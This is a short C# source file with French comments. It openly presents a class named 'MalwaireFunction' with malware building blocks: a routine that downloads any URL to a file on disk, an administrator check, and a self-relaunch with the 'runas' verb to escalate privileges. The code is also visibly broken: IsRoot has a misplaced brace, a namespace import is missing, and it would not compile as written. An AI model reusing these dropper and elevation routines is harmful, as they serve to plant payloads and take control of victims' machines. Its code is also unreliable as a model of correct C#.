using System;
using System.IO;
using System.Net.Http;
using System.Security.Principal;

namespace Lfd{
    class MalwaireFunction{

        public static void donload(string url, string file){
            using (var client = new HttpClient()){
                using (var s = client.GetStreamAsync(url)){
                    using (var fs = new FileStream(file, FileMode.OpenOrCreate)){
                        s.Result.CopyTo(fs);
                    }
                }
            }
        }

        public static bool fileExiste(string file){ 
            return File.Exists(file) ? true : false;
        }


        #if WINDOWS
        public static bool IsRunningAsAdministrator(){
            try{
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch{
                return false;
                
            }
        }
        #endif

        // a tester 
        public static bool DirectoryExistE(string directory){
            if(Directory.Exists(directory)){
                return true;
            }else{
                return  false;
            }
        }


        public static bool IsRoot(){
            #if WINDOWS
            if(!IsRunningAsAdministrator()){}
                return false;
            }// r'envoi true si il et deja admin et si il et pas admin il renvoi false 

            #endif
            return true;
        }

        public static void ElevatROOT(bool number){
            if (number == false){
                //elever les privilège
                #if WINDOWS
                var processInfo = new ProcessStartInfo{
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", 
                    Arguments = Environment.CommandLine 
                };

                try{
                    Process.Start(processInfo);
                    Environment.Exit(0);
                }catch (Exception ex){
                    Console.WriteLine("Error : " + ex.Message);
                }
                #endif 
            }else{
                // les privilège sont déjà élever
                //Console.WriteLine("Programme qui et deja executer en mode admin, ou vous n'êtes pas sous windows");
            }
        }



    };

};

